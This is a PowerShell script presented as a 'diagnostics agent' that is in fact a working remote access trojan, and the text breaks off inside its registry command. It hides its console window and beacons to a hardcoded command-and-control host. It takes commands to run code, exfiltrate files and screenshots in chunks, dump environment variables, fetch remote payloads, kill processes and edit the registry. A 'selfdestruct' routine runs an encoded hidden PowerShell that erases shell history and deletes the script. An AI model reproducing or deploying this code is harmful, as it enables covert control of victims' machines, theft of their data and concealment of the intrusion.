<#
.SYNOPSIS
    Advanced System Diagnostics Agent v5.5 (Final)
.DESCRIPTION
    No logging, no history. Chunked screenshot, safe reg-delete,
    robust selfdestruct path detection, runspace-isolated execution.
#>

# ==================== CONFIGURATION ====================
$C2Server      = "jopawo3457-37085.portmap.host"
$C2Port        = 37085
$UseTLS        = $false
$RetryBase     = 3
$RetryMax      = 300
$HeartbeatInt  = 15
$ConnTimeout   = 10000
$ChunkSize     = 16384
$MaxFileSize   = 50MB
$MaxCatSize    = 1MB
$MaxSearchRes  = 200
$MaxTailLines  = 500
# =======================================================

# ==================== STEALTH ====================
if ($Host.Name -eq 'ConsoleHost') {
    try {
        if (-not ("W.K32" -as [type])) {
            Add-Type -Name 'K32' -Namespace 'W' -PassThru -MemberDefinition @'
            [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
            [DllImport("user32.dll")]   public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
'@ -ErrorAction Stop | Out-Null
        }
        $k = [W.K32]
        [void]$k::ShowWindow($k::GetConsoleWindow(), 0)
    } catch {}
}

# ==================== SELF-PATH RESOLUTION ====================
# Best-effort: tries PSCommandPath, then module path, then process cmdline.
function Resolve-SelfPath {
    $p = $PSCommandPath
    if (-not $p) { $p = $MyInvocation.MyCommand.Path }
    if (-not $p) { try { $p = $MyInvocation.MyCommand.Definition } catch {} }
    if (-not $p) {
        try {
            $proc = Get-CimInstance Win32_Process -Filter "ProcessId = $PID" -ErrorAction SilentlyContinue
            if ($proc -and $proc.CommandLine) {
                if ($proc.CommandLine -match '-File\s+"?([^"]+\.ps1)"?') { $p = $matches[1] }
            }
        } catch {}
    }
    if ($p -and (Test-Path -LiteralPath $p -ErrorAction SilentlyContinue)) { return $p }
    return $null
}

$Global:__SelfPath = Resolve-SelfPath
if ($Global:__SelfPath) { try { $env:AGENT_PATH = $Global:__SelfPath } catch {} }

# ==================== STATE ====================
$script:_s = @{
    State       = "DISCONNECTED"
    SessionID   = [Guid]::NewGuid().ToString().Substring(0,8)
    Shutdown    = $false
    Destruct    = $false
    CurrentDir  = (Get-Location).Path
    ActiveConn  = $null
    RxChunks    = New-Object System.Collections.Generic.List[System.String]
    RxExpected  = 0
    RxReceived  = 0
    RxPath      = $null
    RxSize      = 0
    RxActive    = $false
    StartTime   = (Get-Date)
    LastPing    = [DateTime]::MinValue
}

# ==================== UTILITY ====================
function Format-ByteSize {
    param([long]$Size)
    $Size = [Math]::Abs($Size)
    if ($Size -ge 1GB) { return ("{0:N2} GB" -f ($Size / 1GB)) }
    if ($Size -ge 1MB) { return ("{0:N2} MB" -f ($Size / 1MB)) }
    if ($Size -ge 1KB) { return ("{0:N2} KB" -f ($Size / 1KB)) }
    return "$Size B"
}

function Get-JitterDelay {
    param([int]$Base, [int]$Max)
    $b = [Math]::Max($Base, 1)
    return [Math]::Min($b + (Get-Random -Minimum 0 -Maximum 6), $Max)
}

function Test-SocketHealth {
    param($TcpClient)
    if ($null -eq $TcpClient -or -not $TcpClient.Connected) { return $false }
    try {
        $readable = $TcpClient.Client.Poll(0, [System.Net.Sockets.SelectMode]::SelectRead)
        if ($readable -and $TcpClient.Client.Available -eq 0) { return $false }
        return $true
    } catch { return $false }
}

function Split-CommandArgs {
    param([string]$InputLine)
    $result = New-Object System.Collections.Generic.List[string]
    $current = ""
    $inQuote = $false
    $wasQuoted = $false
    $quoteChar = [char]0
    foreach ($ch in $InputLine.ToCharArray()) {
        if ($inQuote) {
            if ($ch -eq $quoteChar) { $inQuote = $false; $wasQuoted = $true }
            else { $current += $ch }
        } else {
            if ($ch -eq '"' -or $ch -eq "'") {
                $inQuote = $true; $quoteChar = $ch
            } elseif ($ch -eq ' ' -or $ch -eq "`t") {
                if ($current.Length -gt 0 -or $wasQuoted) {
                    [void]$result.Add($current)
                    $current = ""
                    $wasQuoted = $false
                }
            } else {
                $current += $ch
            }
        }
    }
    if ($current.Length -gt 0 -or $wasQuoted) { [void]$result.Add($current) }
    return [object[]]$result.ToArray()
}

function Get-ArgAt {
    param([object[]]$List, [int]$Index)
    if ($null -eq $List -or $List.Length -le $Index) { return $null }
    return $List[$Index]
}
function Join-Args {
    param([object[]]$List, [int]$Start = 0)
    if ($null -eq $List -or $List.Length -le $Start) { return "" }
    return ($List[$Start..($List.Length - 1)] -join " ")
}

# Runspace-isolated execution with hard timeout. No Start-Job overhead.
function Invoke-WithTimeout {
    param([string]$Command, [int]$TimeoutSec = 30)
    $ps = [System.Management.Automation.PowerShell]::Create()
    try {
        $safeDir = $script:_s.CurrentDir -replace "'", "''"
        $fullScript = "Set-Location -LiteralPath '$safeDir' -ErrorAction SilentlyContinue; $Command"
        [void]$ps.AddScript($fullScript)
        $handle = $ps.BeginInvoke()
        if (-not $handle.AsyncWaitHandle.WaitOne($TimeoutSec * 1000, $false)) {
            try { $ps.Stop() } catch {}
            return "[timeout: killed after ${TimeoutSec}s]"
        }
        $output = $ps.EndInvoke($handle)
        $errs   = $ps.Streams.Error
        $outStr = ($output | Out-String)
        if ($errs -and $errs.Count -gt 0) {
            $errStr = ($errs | Out-String)
            if ($outStr) { $outStr += "`n[stderr]`n$errStr" }
            else         { $outStr = $errStr }
        }
        if ([string]::IsNullOrWhiteSpace($outStr)) { $outStr = "[ok]`n" }
        return $outStr
    } catch {
        return "[error: $_]"
    } finally {
        try { $ps.Dispose() } catch {}
    }
}

# ==================== TRANSPORT ====================
function New-Transport {
    param([string]$Server, [int]$Port)
    $tcp = New-Object System.Net.Sockets.TcpClient
    $tcp.SendTimeout    = 30000
    $tcp.ReceiveTimeout = 30000
    $tcp.NoDelay        = $true

    $iar = $tcp.BeginConnect($Server, $Port, $null, $null)
    try {
        if (-not $iar.AsyncWaitHandle.WaitOne($ConnTimeout, $false)) {
            $tcp.Close(); throw "Connection timeout"
        }
    } finally {
        try { $iar.AsyncWaitHandle.Dispose() } catch {}
    }
    $tcp.EndConnect($iar)

    try {
        $tcp.Client.SetSocketOption(
            [System.Net.Sockets.SocketOptionLevel]::Socket,
            [System.Net.Sockets.SocketOptionName]::KeepAlive, $true)
    } catch {}

    $stream = $tcp.GetStream()
    if ($UseTLS) {
        $ssl = New-Object System.Net.Security.SslStream($stream, $false, { $true })
        $ssl.AuthenticateAsClient($Server)
        $stream = $ssl
    }
    return @{ Tcp = $tcp; Stream = $stream; RxBuffer = "" }
}

function Send-Frame {
    param($Conn, [string]$Type, [string]$Data)
    if ($null -eq $Conn -or $null -eq $Conn.Stream) { return $false }
    try {
        $payload = @{
            type = $Type
            data = $Data
            sid  = $script:_s.SessionID
            ts   = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
        } | ConvertTo-Json -Compress
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload + "`n")
        $Conn.Stream.Write($bytes, 0, $bytes.Length)
        $Conn.Stream.Flush()
        return $true
    } catch { return $false }
}

function Extract-Packets {
    param([hashtable]$Holder)
    $out = New-Object System.Collections.Generic.List[object]
    if (-not $Holder.Buffer) { return @() }
    while ($Holder.Buffer.Contains("`n")) {
        $idx = $Holder.Buffer.IndexOf("`n")
        $line = $Holder.Buffer.Substring(0, $idx).Trim()
        $Holder.Buffer = $Holder.Buffer.Substring($idx + 1)
        if ([string]::IsNullOrEmpty($line)) { continue }
        try {
            $parsed = $line | ConvertFrom-Json
            if ($parsed -is [array]) { foreach ($p in $parsed) { [void]$out.Add($p) } }
            else { [void]$out.Add($parsed) }
        } catch {
            [void]$out.Add(@{ type = "CMD"; data = $line })
        }
    }
    return [object[]]$out.ToArray()
}

function Read-Frame {
    param($Conn, [int]$TimeoutMs = 3000)
    if ($null -eq $Conn -or $null -eq $Conn.Stream) { return $null }
    $buffer = New-Object byte[] 65536
    $sw = [System.Diagnostics.Stopwatch]::StartNew()
    $holder = @{ Buffer = $Conn.RxBuffer }
    $packets = @(Extract-Packets -Holder $holder)
    $Conn.RxBuffer = $holder.Buffer
    if ($packets.Count -gt 0) { $sw.Stop(); return $packets }
    while ($sw.ElapsedMilliseconds -lt $TimeoutMs) {
        try {
            if ($Conn.Stream.DataAvailable) {
                $read = $Conn.Stream.Read($buffer, 0, $buffer.Length)
                if ($read -le 0) { $sw.Stop(); return $null }
                $Conn.RxBuffer += [System.Text.Encoding]::UTF8.GetString($buffer, 0, $read)
                if ($Conn.RxBuffer.Length -gt 8MB) { $Conn.RxBuffer = "" }
                $holder = @{ Buffer = $Conn.RxBuffer }
                $packets = @(Extract-Packets -Holder $holder)
                $Conn.RxBuffer = $holder.Buffer
                if ($packets.Count -gt 0) { $sw.Stop(); return $packets }
            } else {
                Start-Sleep -Milliseconds 50
            }
        } catch {
            $sw.Stop()
            return $null
        }
    }
    $sw.Stop()
    return $null
}

# ==================== COMMAND PROCESSOR ====================
function Invoke-RemoteAction {
    param([string]$RawCommand)
    if ([string]::IsNullOrWhiteSpace($RawCommand)) {
        return @{ type = "OUTPUT"; data = "" }
    }
    $tokens = @(Split-CommandArgs -InputLine $RawCommand.Trim())
    if ($tokens.Count -eq 0) { return @{ type = "OUTPUT"; data = "" } }
    $verb = $tokens[0].ToLower()
    $argList = [object[]]@()
    if ($tokens.Count -gt 1) { $argList = [object[]]$tokens[1..($tokens.Count - 1)] }

    switch ($verb) {
        # ==================== BASIC ====================
        "exit" { return @{ type = "EXIT"; data = "Session closed" } }

        "pong" {
            $tag = if ($argList.Length -gt 0) { Get-ArgAt $argList 0 } else { "" }
            return @{ type = "PONG"; data = $tag }
        }

        "kill" {
            if ($argList.Length -eq 0) {
                $script:_s.Shutdown = $true
                return @{ type = "KILL"; data = "Agent shutting down" }
            }
            $procId = 0
            $argStr = Get-ArgAt $argList 0
            if ([string]::IsNullOrEmpty($argStr) -or -not [int]::TryParse($argStr, [ref]$procId) -or $procId -le 0) {
                return @{ type = "ERROR"; data = "kill: invalid PID '$argStr'" }
            }
            try {
                Stop-Process -Id $procId -Force -ErrorAction Stop
                return @{ type = "OUTPUT"; data = "[+] Process $procId terminated" }
            } catch { return @{ type = "ERROR"; data = "kill: $_" } }
        }

        # ==================== DESTRUCT ====================
        "selfdestruct" {
            if ($argList.Length -lt 1 -or $argList[0] -ne "CONFIRM") {
                return @{ type = "ERROR"; data = "DANGER: selfdestruct requires 'CONFIRM'.`nUsage: selfdestruct CONFIRM" }
            }
            $script:_s.Destruct = $true
            $script:_s.Shutdown = $true

            # multi-source path resolution
            $selfPath = $Global:__SelfPath
            if (-not $selfPath) { $selfPath = Resolve-SelfPath }
            $currentPid = $PID

            try { $env:__WD_PATH = [string]$selfPath } catch {}
            try { $env:__WD_PID  = [string]$currentPid } catch {}

            $cleanupScript = @'
Start-Sleep -Seconds 3
try {
    $h = (Get-PSReadlineOption -ErrorAction SilentlyContinue).HistorySavePath
    if ($h -and (Test-Path $h)) { Remove-Item $h -Force -ErrorAction SilentlyContinue }
} catch {}
try {
    $sp = $env:__WD_PATH
    if ($sp -and (Test-Path -LiteralPath $sp)) {
        $delCmd = '/c timeout /t 2 /nobreak >nul & del /f /q "' + $sp + '" >nul 2>&1'
        Start-Process -FilePath 'cmd.exe' -ArgumentList $delCmd -WindowStyle Hidden
    }
} catch {}
try {
    $tpid = 0
    if ([int]::TryParse($env:__WD_PID, [ref]$tpid) -and $tpid -gt 0) {
        Stop-Process -Id $tpid -Force -ErrorAction SilentlyContinue
    }
} catch {}
'@
            $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cleanupScript))
            try {
                Start-Process -FilePath "powershell.exe" `
                    -ArgumentList "-NoP -NonI -W Hidden -ExecutionPolicy Bypass -Enc $encoded" `
                    -WindowStyle Hidden -ErrorAction SilentlyContinue | Out-Null
            } catch {}

            $note = if ($selfPath) { "File will be removed: $selfPath" } else { "Warning: script path unknown (likely -Enc invocation); process will terminate but file remains on disk." }
            return @{ type = "DESTRUCT"; data = "Self-destruct initiated. $note" }
        }

        # ==================== NAVIGATION ====================
        "cd" {
            try {
                $path = if ($argList.Length -gt 0) { Join-Args $argList 0 } else { $env:USERPROFILE }
                Set-Location -LiteralPath $path -ErrorAction Stop
                $script:_s.CurrentDir = (Get-Location).Path
                return @{ type = "PWD"; data = $script:_s.CurrentDir }
            } catch { return @{ type = "ERROR"; data = "cd: $_" } }
        }
        "pwd" { return @{ type = "PWD"; data = $script:_s.CurrentDir } }
        "whoami" { return @{ type = "OUTPUT"; data = "$env:USERDOMAIN\$env:USERNAME" } }
        "hostname" { return @{ type = "OUTPUT"; data = $env:COMPUTERNAME } }

        # ==================== SYSTEM INFO ====================
        "sysinfo" {
            try {
                $os  = Get-CimInstance Win32_OperatingSystem -ErrorAction SilentlyContinue
                $cpu = Get-CimInstance Win32_Processor -ErrorAction SilentlyContinue | Select-Object -First 1
                $cs  = Get-CimInstance Win32_ComputerSystem -ErrorAction SilentlyContinue
                $ramT = if ($os) { [math]::Round($os.TotalVisibleMemorySize / 1MB, 2) } else { "?" }
                $ramF = if ($os) { [math]::Round($os.FreePhysicalMemory / 1MB, 2) } else { "?" }
                $up   = if ($os) {
                    $t = (Get-Date) - $os.LastBootUpTime
                    "$($t.Days)d $($t.Hours)h $($t.Minutes)m"
                } else { "?" }
                $info = @"
Host      : $env:COMPUTERNAME
User      : $env:USERDOMAIN\$env:USERNAME
OS        : $($os.Caption) $($os.OSArchitecture)
Ver       : $($os.Version) (Build $($os.BuildNumber))
Manufacturer: $($cs.Manufacturer)
Model     : $($cs.Model)
CPU       : $($cpu.Name) [$($cpu.NumberOfCores)C/$($cpu.NumberOfLogicalProcessors)T]
RAM       : $ramT GB (Free: $ramF GB)
Uptime    : $up
Session   : $($script:_s.SessionID)
PID       : $PID
PSVer     : $($PSVersionTable.PSVersion)
AgentUp   : $([math]::Round(((Get-Date) - $script:_s.StartTime).TotalSeconds,0))s
"@
                return @{ type = "OUTPUT"; data = $info }
            } catch { return @{ type = "ERROR"; data = "sysinfo: $_" } }
        }

        "env" {
            try {
                $lines = Get-ChildItem Env: | Sort-Object Name | ForEach-Object { "$($_.Name)=$($_.Value)" }
                return @{ type = "OUTPUT"; data = ($lines -join "`n") }
            } catch { return @{ type = "ERROR"; data = "env: $_" } }
        }

        "drives" {
            try {
                $lines = Get-PSDrive -PSProvider FileSystem | ForEach-Object {
                    $used = if ($_.Used) { Format-ByteSize $_.Used } else { "?" }
                    $free = if ($_.Free) { Format-ByteSize $_.Free } else { "?" }
                    "$($_.Name):\  Used=$used  Free=$free  Root=$($_.Root)"
                }
                return @{ type = "OUTPUT"; data = ($lines -join "`n") }
            } catch { return @{ type = "ERROR"; data = "drives: $_" } }
        }

        "services" {
            try {
                $filter = if ($argList.Length -gt 0) { Get-ArgAt $argList 0 } else { "*" }
                $svcs = if ($filter -eq "*") {
                    Get-Service -ErrorAction SilentlyContinue
                } else {
                    Get-Service -Name $filter -ErrorAction SilentlyContinue
                }
                if (-not $svcs) { return @{ type = "OUTPUT"; data = "No services matched '$filter'" } }
                $out = $svcs | Select-Object -First 100 Status, Name, DisplayName | Format-Table -AutoSize | Out-String
                return @{ type = "OUTPUT"; data = $out }
            } catch { return @{ type = "ERROR"; data = "services: $_" } }
        }

        "tasks" {
            try {
                $tasks = Get-ScheduledTask -ErrorAction SilentlyContinue |
                    Select-Object -First 100 TaskPath, TaskName, State
                if (-not $tasks) { return @{ type = "OUTPUT"; data = "No scheduled tasks" } }
                return @{ type = "OUTPUT"; data = ($tasks | Format-Table -AutoSize | Out-String) }
            } catch { return @{ type = "ERROR"; data = "tasks: $_" } }
        }

        "netstat" {
            try {
                if (Get-Command Get-NetTCPConnection -ErrorAction SilentlyContinue) {
                    $lines = Get-NetTCPConnection -ErrorAction SilentlyContinue |
                        Where-Object State -eq 'Established' |
                        Select-Object -First 100 LocalAddress, LocalPort, RemoteAddress, RemotePort, State, OwningProcess
                    return @{ type = "OUTPUT"; data = ($lines | Format-Table -AutoSize | Out-String) }
                }
            } catch {}
            try {
                $out = & netstat -ano 2>&1 | Out-String
                return @{ type = "OUTPUT"; data = $out }
            } catch { return @{ type = "ERROR"; data = "netstat: $_" } }
        }

        "ifconfig" {
            try {
                $out = @()
                $adapters = Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object Status -eq "Up"
                foreach ($a in $adapters) {
                    $ips = Get-NetIPAddress -InterfaceIndex $a.InterfaceIndex -AddressFamily IPv4 -ErrorAction SilentlyContinue
                    $ipstr = ($ips | ForEach-Object { "$($_.IPAddress)/$($_.PrefixLength)" }) -join ", "
                    $out += "$($a.Name): $ipstr [$($a.MacAddress)]"
                }
                if ($out.Count -eq 0) { $out = @("No active adapters") }
                return @{ type = "OUTPUT"; data = ($out -join "`n") }
            } catch { return @{ type = "ERROR"; data = "ifconfig: $_" } }
        }

        # ==================== PROCESSES ====================
        "ps" {
            try {
                $filter = if ($argList.Length -gt 0) { Get-ArgAt $argList 0 } else { $null }
                $procs = Get-Process
                if ($filter) { $procs = $procs | Where-Object { $_.ProcessName -like "*$filter*" } }
                $procs = $procs | Sort-Object WorkingSet64 -Descending | Select-Object -First 50 |
                    Select-Object Id, ProcessName,
                        @{N="CPU";E={ if ($_.CPU) { [math]::Round($_.CPU,2) } else { 0 } }},
                        @{N="RAM";E={ Format-ByteSize $_.WorkingSet64 }},
                        @{N="Started";E={ try { $_.StartTime.ToString('HH:mm:ss') } catch { '?' }}}
                return @{ type = "OUTPUT"; data = ($procs | Format-Table -AutoSize | Out-String) }
            } catch { return @{ type = "ERROR"; data = "ps: $_" } }
        }

        # ==================== FILESYSTEM ====================
        "ls" {
            try {
                $target = if ($argList.Length -gt 0) { Join-Args $argList 0 } else { $script:_s.CurrentDir }
                $entries = Get-ChildItem -LiteralPath $target -Force -ErrorAction Stop | Sort-Object PSIsContainer, Name
                $lines = foreach ($e in $entries) {
                    $m  = if ($e.PSIsContainer) { 'd' } else { '-' }
                    $sz = if ($e.PSIsContainer) { '<DIR>' } else { Format-ByteSize $e.Length }
                    $dt = $e.LastWriteTime.ToString('yyyy-MM-dd HH:mm')
                    "{0} {1,12} {2}  {3}" -f $m, $sz, $dt, $e.Name
                }
                if (-not $lines) { return @{ type = "OUTPUT"; data = "(empty)" } }
                return @{ type = "OUTPUT"; data = ($lines -join "`n") }
            } catch { return @{ type = "ERROR"; data = "ls: $_" } }
        }

        "tree" {
            try {
                $target = if ($argList.Length -gt 0) { Get-ArgAt $argList 0 } else { $script:_s.CurrentDir }
                $out = @()
                $item = Get-Item -LiteralPath $target -ErrorAction Stop
                $base = $item.FullName.TrimEnd('\')
                $out += $base
                Get-ChildItem -LiteralPath $target -Recurse -Depth 3 -ErrorAction SilentlyContinue |
                    Select-Object -First 200 | ForEach-Object {
                        $rel = $_.FullName.Substring($base.Length).TrimStart('\')
                        if ([string]::IsNullOrEmpty($rel)) { return }
                        $parts = $rel -split '\\'
                        $depth = [Math]::Max(0, $parts.Count - 1)
                        $prefix = ('  ' * $depth) + '+-- '
                        $suffix = if ($_.PSIsContainer) { '/' } else { '' }
                        $out += "$prefix$($_.Name)$suffix"
                    }
                return @{ type = "OUTPUT"; data = ($out -join "`n") }
            } catch { return @{ type = "ERROR"; data = "tree: $_" } }
        }

        "cat" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: cat <file>" } }
            try {
                $p = Join-Args $argList 0
                $f = Get-Item -LiteralPath $p -ErrorAction Stop
                if ($f.PSIsContainer) { return @{ type = "ERROR"; data = "cat: is a directory" } }
                if ($f.Length -gt $MaxCatSize) { return @{ type = "ERROR"; data = "File too large. Use download." } }
                $txt = $null
                try { $txt = [IO.File]::ReadAllText($f.FullName, [Text.Encoding]::UTF8) } catch {}
                if ($null -eq $txt -or $txt.Contains([char]0xFFFD)) {
                    $txt = Get-Content -LiteralPath $f.FullName -Raw -Encoding Default -ErrorAction Stop
                }
                return @{ type = "OUTPUT"; data = $txt }
            } catch { return @{ type = "ERROR"; data = "cat: $_" } }
        }

        "head" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: head <file> [lines]" } }
            try {
                $p = Get-ArgAt $argList 0
                $n = if ($argList.Length -gt 1) { [int](Get-ArgAt $argList 1) } else { 20 }
                $lines = Get-Content -LiteralPath $p -TotalCount $n -ErrorAction Stop
                return @{ type = "OUTPUT"; data = ($lines -join "`n") }
            } catch { return @{ type = "ERROR"; data = "head: $_" } }
        }

        "tail" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: tail <file> [lines]" } }
            try {
                $p = Get-ArgAt $argList 0
                $n = if ($argList.Length -gt 1) { [int](Get-ArgAt $argList 1) } else { 20 }
                if ($n -gt $MaxTailLines) { $n = $MaxTailLines }
                $lines = Get-Content -LiteralPath $p -Tail $n -ErrorAction Stop
                return @{ type = "OUTPUT"; data = ($lines -join "`n") }
            } catch { return @{ type = "ERROR"; data = "tail: $_" } }
        }

        "find" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: find <pattern> [path]" } }
            try {
                $pattern = (Get-ArgAt $argList 0) -replace '([\[\]])', '`$1'
                $path = if ($argList.Length -gt 1) { Get-ArgAt $argList 1 } else { $script:_s.CurrentDir }
                $results = Get-ChildItem -LiteralPath $path -Recurse -Force -ErrorAction SilentlyContinue |
                    Where-Object { $_.Name -like "*$pattern*" } |
                    Select-Object -First $MaxSearchRes
                if (-not $results) { return @{ type = "OUTPUT"; data = "No matches" } }
                return @{ type = "OUTPUT"; data = (($results | ForEach-Object { $_.FullName }) -join "`n") }
            } catch { return @{ type = "ERROR"; data = "find: $_" } }
        }

        "grep" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: grep <pattern> <file>" } }
            try {
                $pat = Get-ArgAt $argList 0
                $file = Get-ArgAt $argList 1
                $hits = Select-String -LiteralPath $file -Pattern $pat -ErrorAction Stop |
                    Select-Object -First $MaxSearchRes
                if (-not $hits) { return @{ type = "OUTPUT"; data = "No matches" } }
                return @{ type = "OUTPUT"; data = (($hits | ForEach-Object { "$($_.LineNumber): $($_.Line)" }) -join "`n") }
            } catch { return @{ type = "ERROR"; data = "grep: $_" } }
        }

        "hash" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: hash <file> [MD5|SHA1|SHA256]" } }
            try {
                $p = Get-ArgAt $argList 0
                $algo = if ($argList.Length -gt 1) { (Get-ArgAt $argList 1).ToUpper() } else { "SHA256" }
                $h = Get-FileHash -LiteralPath $p -Algorithm $algo -ErrorAction Stop
                return @{ type = "OUTPUT"; data = "$($h.Algorithm): $($h.Hash)`nFile: $($h.Path)" }
            } catch { return @{ type = "ERROR"; data = "hash: $_" } }
        }

        "rm" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: rm <path>" } }
            try {
                Remove-Item -LiteralPath (Join-Args $argList 0) -Recurse -Force -ErrorAction Stop
                return @{ type = "OUTPUT"; data = "[+] Removed" }
            } catch { return @{ type = "ERROR"; data = "rm: $_" } }
        }

        "mkdir" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: mkdir <dir>" } }
            try {
                $d = New-Item -ItemType Directory -Path (Join-Args $argList 0) -Force -ErrorAction Stop
                return @{ type = "OUTPUT"; data = "[+] Created: $($d.FullName)" }
            } catch { return @{ type = "ERROR"; data = "mkdir: $_" } }
        }

        "cp" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: cp <src> <dst>" } }
            try {
                Copy-Item -LiteralPath (Get-ArgAt $argList 0) -Destination (Get-ArgAt $argList 1) -Recurse -Force -ErrorAction Stop
                return @{ type = "OUTPUT"; data = "[+] Copied" }
            } catch { return @{ type = "ERROR"; data = "cp: $_" } }
        }

        "mv" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: mv <src> <dst>" } }
            try {
                Move-Item -LiteralPath (Get-ArgAt $argList 0) -Destination (Get-ArgAt $argList 1) -Force -ErrorAction Stop
                return @{ type = "OUTPUT"; data = "[+] Moved" }
            } catch { return @{ type = "ERROR"; data = "mv: $_" } }
        }

        # ==================== TRANSFER ====================
        "download" {
            if ($argList.Length -eq 0) { return @{ type = "ERROR"; data = "Usage: download <remote_path>" } }
            try {
                $src = Join-Args $argList 0
                if (-not (Test-Path -LiteralPath $src)) { return @{ type = "ERROR"; data = "File not found" } }
                $f = Get-Item -LiteralPath $src
                if ($f.PSIsContainer) { return @{ type = "ERROR"; data = "Cannot download directory" } }
                if ($f.Length -gt $MaxFileSize) { return @{ type = "ERROR"; data = "File too large (>$($MaxFileSize/1MB)MB)" } }
                $bytes = [IO.File]::ReadAllBytes($f.FullName)
                $b64   = [Convert]::ToBase64String($bytes)
                $chunks = if ($b64.Length -gt 0) { [Math]::Ceiling($b64.Length / $ChunkSize) } else { 0 }
                if (-not (Send-Frame -Conn $script:_s.ActiveConn -Type "FILE_START" -Data "$($f.Name)|$($bytes.Length)|$chunks")) {
                    return @{ type = "ERROR"; data = "download: failed to send header" }
                }
                for ($i = 0; $i -lt $chunks; $i++) {
                    $start = $i * $ChunkSize
                    $len   = [Math]::Min($ChunkSize, $b64.Length - $start)
                    if (-not (Send-Frame -Conn $script:_s.ActiveConn -Type "FILE_CHUNK" -Data "$i|$($b64.Substring($start, $len))")) {
                        return @{ type = "ERROR"; data = "download: chunk $i failed" }
                    }
                    if ($i % 20 -eq 0) { Start-Sleep -Milliseconds 10 }
                }
                return @{ type = "FILE_DONE"; data = "$($f.Name)|$($bytes.Length)" }
            } catch { return @{ type = "ERROR"; data = "download: $_" } }
        }

        "upload" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: upload <server_path> <local_path>" } }
            return @{ type = "UPLOAD_REQ"; data = "$(Get-ArgAt $argList 0)|$(Get-ArgAt $argList 1)" }
        }

        "wget" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: wget <url> <output_path>" } }
            try {
                $url = Get-ArgAt $argList 0
                $outPath = Get-ArgAt $argList 1
                Invoke-WebRequest -Uri $url -OutFile $outPath -UseBasicParsing -TimeoutSec 60 -ErrorAction Stop
                $sz = (Get-Item -LiteralPath $outPath).Length
                return @{ type = "OUTPUT"; data = "[+] Downloaded: $outPath ($(Format-ByteSize $sz))" }
            } catch { return @{ type = "ERROR"; data = "wget: $_" } }
        }

        "compress" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: compress <src_path> <dst_zip>" } }
            try {
                Compress-Archive -LiteralPath (Get-ArgAt $argList 0) -DestinationPath (Get-ArgAt $argList 1) -Force -ErrorAction Stop
                $sz = (Get-Item -LiteralPath (Get-ArgAt $argList 1)).Length
                return @{ type = "OUTPUT"; data = "[+] Compressed: $(Get-ArgAt $argList 1) ($(Format-ByteSize $sz))" }
            } catch { return @{ type = "ERROR"; data = "compress: $_" } }
        }

        "uncompress" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: uncompress <zip> <dst_dir>" } }
            try {
                Expand-Archive -LiteralPath (Get-ArgAt $argList 0) -DestinationPath (Get-ArgAt $argList 1) -Force -ErrorAction Stop
                return @{ type = "OUTPUT"; data = "[+] Extracted to: $(Get-ArgAt $argList 1)" }
            } catch { return @{ type = "ERROR"; data = "uncompress: $_" } }
        }

        # ==================== SCREEN (chunked) ====================
        "screenshot" {
            try {
                if (-not ("System.Windows.Forms.Screen" -as [type])) {
                    Add-Type -AssemblyName System.Windows.Forms -ErrorAction Stop
                }
                if (-not ("System.Drawing.Bitmap" -as [type])) {
                    Add-Type -AssemblyName System.Drawing -ErrorAction Stop
                }
                $scr = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                $bmp = New-Object System.Drawing.Bitmap($scr.Width, $scr.Height)
                $ms  = New-Object System.IO.MemoryStream
                $b64 = $null
                try {
                    $gfx = [System.Drawing.Graphics]::FromImage($bmp)
                    try {
                        $gfx.CopyFromScreen($scr.Location, [System.Drawing.Point]::Empty, $scr.Size)
                    } finally { $gfx.Dispose() }
                    $bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png)
                    $b64 = [Convert]::ToBase64String($ms.ToArray())
                } finally {
                    try { $bmp.Dispose() } catch {}
                    try { $ms.Dispose() } catch {}
                }
                if (-not $b64) { return @{ type = "ERROR"; data = "screenshot: empty image" } }
                $chunks = [Math]::Ceiling($b64.Length / $ChunkSize)
                if (-not (Send-Frame -Conn $script:_s.ActiveConn -Type "SCREENSHOT_START" -Data "screenshot.png|$chunks")) {
                    return @{ type = "ERROR"; data = "screenshot: header failed" }
                }
                for ($i = 0; $i -lt $chunks; $i++) {
                    $start = $i * $ChunkSize
                    $len   = [Math]::Min($ChunkSize, $b64.Length - $start)
                    if (-not (Send-Frame -Conn $script:_s.ActiveConn -Type "SCREENSHOT_CHUNK" -Data "$i|$($b64.Substring($start, $len))")) {
                        return @{ type = "ERROR"; data = "screenshot: chunk $i failed" }
                    }
                    if ($i % 20 -eq 0) { Start-Sleep -Milliseconds 10 }
                }
                return @{ type = "SCREENSHOT_DONE"; data = "screenshot.png|$chunks" }
            } catch { return @{ type = "ERROR"; data = "screenshot: $_" } }
        }

        # ==================== REGISTRY ====================
        "reg" {
            if ($argList.Length -lt 2) { return @{ type = "ERROR"; data = "Usage: reg <read|write|delete> <path> [name] [data]" } }
            try {
                $action = (Get-ArgAt $argList 0).ToLower()
                $path = Get-ArgAt $argList 1
                switch ($action) {
                    "read" {
                        $val = Get-ArgAt $argList 2
                        if ($val) {
                            $r = Get-ItemProperty -Path $path -Name $val -ErrorAction Stop
                            return @{ type = "OUTPUT"; data = "$val = $($r.$val)" }
                        } else {
                            $r = Get-ItemProperty -Path $path -ErrorAction Stop
